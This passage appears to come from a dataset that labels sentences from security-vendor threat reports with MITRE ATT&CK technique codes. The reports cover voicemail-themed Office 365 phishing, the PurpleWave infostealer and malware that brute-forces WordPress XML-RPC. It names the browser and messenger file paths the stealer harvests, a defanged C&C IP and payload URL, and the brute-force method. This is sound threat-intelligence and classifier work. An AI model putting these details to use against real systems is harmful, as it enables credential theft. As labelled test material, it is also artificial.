voicemail as themes for their credential-stealing phishing campaigns.", "labels": ["T1566", "T1583", "TA0006"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "In the most recent instance we saw, attackers were spoofing Cisco\u2019s Unity Connection voicemail platform.", "labels": ["T1557"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "The use of voicemail delivered in an email message, and the use of phishing pages that spoof enterprise applications, such as Office 365 and Outlook, signal the attackers\u2019 motives.", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "If successful in obtaining a user\u2019s credentials, attackers can access confidential data from the enterprise, potentially selling it or holding it for ransom.", "labels": ["TA0006", "TA0009"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "The attacks are being distributed through email with an HTML attachment that contains JavaScript code which redirects the user to the credential phishing site.", "labels": ["T1566", "T1059", "T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "Contents of the email are crafted to mimic a system-generated voicemail notification, luring the user to open the attachment to access the recorded voice message as shown in Figure 1.", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "*Figure 1: Email message spoofing a voicemail notification*", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "**HTML attachment analysis**", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "We observed different variants of HTML attachments used in these credential-phishing campaigns.", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "The email attachment is an HTML file that contains a short code snippet of JavaScript.", "labels": ["T1566", "T1059"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "It uses *window.location.replace()* to redirect the user to the phishing site, as shown in Figure 2.", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "In the second variant, the HTML attachment contains JavaScript code that is used to decode the next-stage HTML.", "labels": ["T1059", "T1140"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "*Figure 4: HTML attachment containing encoded JavaScript*", "labels": ["T1059"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "The decoded content shown in Figure 5 uses the meta-refresh tag to redirect the user to the target credential phishing site.", "labels": ["TA0006", "T1140"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "*Figure 5: Decoded content which uses meta-refresh tag to redirect*", "labels": ["T1140"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "**Phishing content loaded remotely using JavaScript**", "labels": ["T1059", "T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "In a few variants of the phishing landing pages, we observed that the final landing page used an external JavaScript to display the credential-phishing page in the browser.", "labels": ["T1059", "T1566", "T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "Figure 6\u00a0shows the source code of the phishing page; the highlighted part is the external JavaScript used to display the phishing content.", "labels": ["T1059", "T1566", "T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "All of these external JavaScript files use\u00a0long filenames of 32 characters resembling an MD5 hash.", "labels": ["T1059"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "*Figure 6: Phishing landing page referencing an externally hosted JavaScript to load phishing content*", "labels": ["T1059", "T1566", "T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "Unlike common credential-phishing landing pages, we can see in this case that there is no information related to the brand being targeted.", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "This allows the threat actors to bypass many automated URL analysis engines and extend its survival.", "labels": ["TA0005"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "Figure 7\u00a0shows the relevant JavaScript code and where the user\u2019s credentials are being sent.", "labels": ["T1059", "TA0010"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "This code is present in randomly named and externally hosted JavaScript files.", "labels": ["T1059"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "*Figure 7: JavaScript file used to send user\u2019s credentials to attacker\u2019s server*", "labels": ["T1059", "TA0010"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "Figure 8\u00a0shows a sample packet capture which highlights the method used to exfiltrate the stolen credentials to the attacker\u2019s site.", "labels": ["TA0010"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "It is important to note that in the first attempt, this phishing page will always give the \"password incorrect\" message,\u00a0which prompts users to enter their passwords more cautiously the next time.", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "*Figure 8: Packet capture showing credentials being exfiltrated*", "labels": ["TA0010"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "*Figure 10: Google reCAPTCHA\u00a0used as a security challenge on the phishing page for evasion*", "labels": ["TA0005"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "Users will be redirected to the main credential-phishing page after solving\u00a0the captcha.", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "The final phishing page spoofs the Microsoft Office 365 login page, as shown in Figures 11\u00a0and 12.", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "*Figure 11: Credential-phishing landing page to steal Office 365 credentials*", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "*Figure 12: Office 365 phishing page*", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "Below is a list of domains we identified that were registered between June and mid-July 2020 and were used by the threat actor(s) for conducting credential-phishing campaigns using the voicemail theme.", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "* The URL pattern used for credential phishing is: hxxp://domain\\_name.xyz/?e=<email\\_address>", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "* If the URL is accessed directly without the email address in the URL as a parameter, the user will be redirected to the office.com site", "labels": ["TA0005"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "Once this icon is clicked, the user is redirected to the credential-phishing landing page, which is designed to target multiple brands, as shown in Figure 14.", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "*Figure 14: Landing page targeting multiple brands*", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "Once the user clicks on any of the above links, a corresponding phishing page is displayed.", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "As an example, the OWA phishing page is displayed (Figure 15) when the user clicks the \u201cOutlook Web Access\u201d link on the web page.", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "This threat actor leverages well-crafted social engineering techniques and combines them with evasion tactics designed to bypass automated URL analysis solutions to achieve better success in reaching users and stealing their credentials.", "labels": ["TA0006"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "As an extra precaution, users should not open attachments in emails\u00a0sent from untrusted or unknown sources.", "labels": ["T1566"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "Infostealer is one of the most profitable tools for cybercriminals, as information gathered from systems infected with this malware could be sold in the cybercrime underground or used for credential stuffing attacks.", "labels": ["T1078"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "The Zscaler ThreatLabZ team came across a new Infostealer called PurpleWave, which is written in C++\u00a0and silently installs itself onto a user\u2019s system.", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "It connects to a command and control (C&C) server to send system information and installs new malware onto the infected system.", "labels": ["TA0011", "TA0011", "T1041", "T1105"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "The author of this malware is advertising and selling PurpleWave stealer\u00a0on Russian cybercrime forums for 5,000 RUB (US$68) with lifetime updates and 4,000 RUB (US$54) with only two updates.", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "![PurpleWave selling post on the Russian forum](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/purple_website.JPG)", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "*Figure 1: A PurpleWave selling post on a Russian forum.*", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "The author selling PurpleWave claims that this stealer is capable of stealing passwords, cookies, cards, and autofill forms of Chromium\u00a0and Mozilla browsers.", "labels": ["T1555"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "This stealer also collects files from the specified path, takes screenshots, and installs additional modules.", "labels": ["T1005", "T1113", "T1105"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "The capabilities of the PurpleWave stealer include:", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "* Stealing\u00a0passwords, cookies, cards, autofill(s) data, browser history from Chromium and Mozilla.", "labels": ["T1217"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "* Collecting\u00a0files from the specified path", "labels": ["T1005"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "* Capturing the\u00a0screen", "labels": ["T1113"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "* Stealing\u00a0system information", "labels": ["T1082"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "* Stealing\u00a0Telegram session files", "labels": ["T1005"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "* Stealing\u00a0Steam application data", "labels": ["T1005"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "* Stealing\u00a0Electrum wallet data", "labels": ["T1005"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "* Loading\u00a0and executing\u00a0additional module/malware", "labels": ["T1105"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "![PurpleWave Login Panel](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/purple_panel.PNG)", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "*Figure 2: The PurpleWave login panel.*", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "![PurpleWave Infection dashboard](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/purple_panel1.jpg)", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "*Figure 3: The PurpleWave infection dashboard.*", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "The dashboard also provides the attacker with the ability to customize the configuration of the PurpleWave stealer.", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "![Dashboard for customizing PurpleWave configuration](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/purple_panel3.jpg)", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "*Figure 4: The dashboard for customizing the PurpleWave configuration.*", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "Upon execution of the PurpleWave binary, it gives a fake error message in the Russian language that can be customized by the attacker in their panel.", "labels": ["TA0002"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "But in the background, it performs all of its malicious activities.", "labels": ["TA0005"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "The name of the stealer (PurpleWave) and the version (1.0) are hardcoded and encrypted in the binary.", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "Most of the strings in the binary are encrypted, but they get\u00a0decrypted on runtime with the help of the decryption loop present in the binary (shown in Figure 6).", "labels": ["T1027", "T1140"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "*Figure 6: The common decryption function for the encrypted strings in the binary.*", "labels": ["T1140"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "The PurpleWave binary creates a mutex with the name \u201cMutexCantRepeatThis\u201d to avoid multiple executions of malware instances.", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "After that, it sends the HTTP POST request with the custom header and body to the C&C URL to get the configuration data.", "labels": ["TA0011", "T1071"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "*Figure 7:\u00a0Sending request to the C&C server to get the config data.*", "labels": ["TA0011", "T1105"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "It creates an HTTP request header with content type as \u201cform-data\u201d.", "labels": ["T1071"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "It creates a request body with a form name as \u201cid\u201d and the value assigned to it is 1.", "labels": ["T1071"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "*Figure 8: The configuration request with the custom header and body.*", "labels": ["T1071"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "We have observed three different configurations and different hosts of the PurpleWave binaries.", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "![Configuration from different PurpleWave binaries](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/config_comapre.png)", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "*Figure 9: The configuration from different PurpleWave binaries.*", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "dirs - It consists of directory information from which files to be collected.", "labels": ["T1083", "T1005"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "For Config-2, PurpleWave will traverse path \u201c%userprofile%/Desktop\u201d and collect the files having extensions txt, doc and docx.", "labels": ["T1005"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "In Config-3, it will not collect any files but it has a module named \u201cKv2TDW4O\u201d in the loaders, which will get downloaded and executed on the system.", "labels": ["T1105"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "For installing additional modules mentioned in the received configuration (Config-3), PurpleWave\u00a0again creates an HTTP POST request with the same headers mentioned in the previous request to the C&C host followed by \u201c/loader/module\\_name\u201d.", "labels": ["TA0011", "T1071"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "*Figure 10: The request to download an additional module.*", "labels": ["T1105"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "PurpleWave enumerates the loaders list from a JSON configuration, downloads the module name from the C&C server and stores it in %appdata% directory, then executes it.", "labels": ["TA0011", "TA0002", "T1105"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "*Figure 11:\u00a0Downloading and executing additional modules.*", "labels": ["TA0002", "T1105"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "The downloaded module that we observed in some PurpleWave binary is the Electrum wallet stealer, which is written in .NET\u00a0and capable of stealing Electrum wallet data from the infected system.", "labels": ["T1005", "T1059", "T1005"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "![Collecting Electrum wallet data](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/walletstealer.PNG)", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "*Figure 12:\u00a0Collecting Electrum wallet data.*", "labels": ["T1005"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "PurpleWave\u00a0is capable of stealing credentials, autofills data, card data, cookies, and browser history from Chromium and Mozilla.", "labels": ["TA0006", "T1217"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "For Chromium browsers, it fetches the login credentials from \u201c\\%AppData%\\Local\\{Browser}\\User Data\\Default\\Login Data\u201d, cookies from \u201c\\%AppData%\\Local\\{Browser}\\User Data\\Default\\Cookies\u201d,\u00a0and other information, such as autofills data, card data, and browser history, from \u201c\\%AppData%\\Local\\{Browser}\\User Data\\Default\\Web Data\u201d.", "labels": ["T1555", "T1606", "T1555", "T1217"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "*Figure 13:Stealing browser\u00a0data.*", "labels": ["T1217"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "The stolen browser info is collected in the form of a form-data field with the names shown below followed by their value.", "labels": ["T1217"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "![Stolen Browser info](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/browser_collected.png)", "labels": ["T1555"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "Along with the browser\u2019s data, the stealer captures the current screen and appends it to the browser's stolen data in the form-data with the filename as \u201cscreenshot.png\u201d.", "labels": ["T1113", "T1555", "T1555"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "After that, it collects all the information about infected systems, such as operating system, CPU info, GPU info, machine GUID, username, machine name, and more.", "labels": ["T1033"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "*Figure 16: The\u00a0system information collected by PurpleWave.*", "labels": ["T1082"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "The stealer also collects the SSFN files from the Steam application.", "labels": ["T1005"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "It fetches the Steam path from the registry \u201cSoftware\\\\Valve\\\\Steam\u201d and reads all the SSFN files stored into the config directory.", "labels": ["T1005"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "PurpleWave also steals session-related files from the Telegram application.", "labels": ["T1528"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "It reads the value of the default key in the system registry branch \u201cHKCU\\Software\\Classes\\tdesktop.tg\\DefaultIcon\u201d\u00a0to obtain a path of Telegram and collects all the files starts with \u201cmap\u201d in the \u201cD877F783D5D3EF8C\u201d directory.", "labels": ["T1528"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "*Figure 17:\u00a0Collecting Steam and Telegram data.*", "labels": ["T1005"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "PurpleWave merges all the collected\u00a0file\u00a0data, browser data, screenshots, Steam data, Telegram data, and system info, then sends it to a C&C server using an HTTP POST request.", "labels": ["TA0011", "T1041"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "![Sending stolen data to C&C server](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/gate_post.JPG)", "labels": ["TA0011"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "*Figure 18:\u00a0Sending stolen data to C&C server*", "labels": ["TA0011", "T1041"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "![The Zscaler Cloud Sandbox report for the PurpleWave Stealer](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/purplewave/sandbox1.JPG)", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "*Figure 19:\u00a0The Zscaler Cloud Sandbox report for PurpleWave.*", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "Zscaler believes that PurpleWave represents an active and ongoing threat, as the\u00a0C&C\u00a0servers are still alive and responding as of this writing.", "labels": ["TA0011"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "PurpleWave has incredible potential to steal sensitive information.", "labels": [], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "T1083\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0File and directory discovery", "labels": ["T1083"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "T1082\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0System information discovery", "labels": ["T1082"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "T1033\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0System user discovery", "labels": ["T1033"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "T1124\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0System time discovery", "labels": ["T1124"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "T1016\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0System network configuration discovery", "labels": ["T1016"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "T1020\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0Automated exfiltration", "labels": ["T1020"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "T1041\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0Exfiltration over C&C channel", "labels": ["T1041", "TA0011"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "T1071\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0Uses web protocols", "labels": ["T1071"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "T1105\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0Downloads additional files", "labels": ["T1105"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "T1555\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0Credentials from web browsers", "labels": ["T1555"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "T1539\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0Steal web session cookies", "labels": ["T1539"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "T1005\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0Data from local system", "labels": ["T1005"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "T1113\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0Screen capture", "labels": ["T1113"], "document": "zscaler_2020-08-14_purplewave-new-infostealer-russia"}, {"sentence": "Malware Leveraging XML-RPC Vulnerability to Exploit WordPress Sites", "labels": ["T1190"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "We have written a number of blogs about [vulnerabilities within](/blogs/research/cybercriminals-targeting-multiple-vulnerabilities-wordpress-plugins) and [attacks on](/blogs/research/compromised-wordpress-sites-used-distribute-adwind-rat) sites built with WordPress.", "labels": ["T1190"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "One of the most common attack vectors employed by these bad actors is to launch an XML-RPC attack.", "labels": ["T1190"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "XML-RPC on WordPress, which is enabled by default, is actually an API that provides third-party applications and services the ability to interact with WordPress sites, rather than through a browser.", "labels": ["T1190"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "Attackers use this channel to establish a remote connection to a WordPress site and make modifications without being directly logged in to your WordPress system.", "labels": ["T1190"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "However, if a WordPress site didn\u2019t disable XML-RPC, there is no limit to the number of login attempts that can be made by a hacker, meaning it is just a matter of time before a cybercriminal\u00a0can gain access.", "labels": ["T1110"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "Recently, the Zscaler ThreatLabZ team came across a scheme to attack WordPress sites where a malicious program gets a list of WordPress sites from a C&C server which then are attacked leveraging the XML-RPC pingback method to fingerprint the existing vulnerabilities on the listed WordPress sites.", "labels": ["TA0011", "T1190"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "The initial layer of the malware is for decoding the URIs used to make initial contact with the C&C server.", "labels": ["TA0011", "T1140"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "The first section is unpacked as shown in Figure 2:", "labels": ["T1140"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "![Figure 2: Decryption Loop](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/WPbrutebot/Figure%202.png)", "labels": ["T1140"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "*Figure 2: The decryption loop of this program.*", "labels": ["T1140"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "This decryption loop is a simple XOR decryption that sequentially runs from B5 to C7, which gives us /lk4238fh317/update.php.", "labels": ["T1140"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "*Figure 3: The decrypted string of this program.*", "labels": ["T1140"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "Next, the domain is generated using another XOR-based decryption where the key goes from B5 to C0.", "labels": ["T1140"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "*Figure 4: The decryption loop for this program.*", "labels": ["T1140"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "The blockchain DNS URI is decrypted using a similar XOR loop as shown in Figure 6.", "labels": ["T1140"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "*Figure 6: The decryption loop.*", "labels": ["T1140"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "*Figure 7: The decrypted strings.*", "labels": ["T1140"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "The DNS request generated produces a C&C IP of 217.8.117[.]48, which can be confirmed online at explorer.emercoin[.]com/nvs/dns.", "labels": ["TA0011"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "The segment of a URL created during the first decryption loop (as shown above) is then used with the IP address to contact the C&C.", "labels": ["TA0011", "T1140"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "The C&C then replies back with 217.8.117[.]48/j537djjlhg763/svchst.exe, which is the downloaded payload.", "labels": ["TA0011", "T1105"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "The payload is downloaded at C:\\Users\\User-Name\\AppData\\Roaming\\svchst.exe.", "labels": ["T1105"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "*Figure 12: The program downloading an updated version of itself.*", "labels": ["T1105"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "The downloaded sample (MD5:86374F27C1A915D970BE3103D22512B9) is an updated version of the parent sample, which downloads itself to ensure that the latest version of the malicious program is running on the system.", "labels": ["T1105"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "The string is obfuscated by breaking the string in two parts\u2014k623 and 9847.lib, which are concatenated in memory.", "labels": ["T1027"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "The program then enumerates system information including information such as user name, processor architecture, and more.", "labels": ["T1082"], "document": "zscaler_2020-09-16_malware-leveraging-xml-rpc-vulnerability"}, {"sentence": "Here, the malicious program is using ***<methodName>wp.getUsersBlogs</methodName>*** to execute a brute force attack via the \u201c*wp.getUsersBlogs*\u201d method of xmlrpc.php where an attacker is 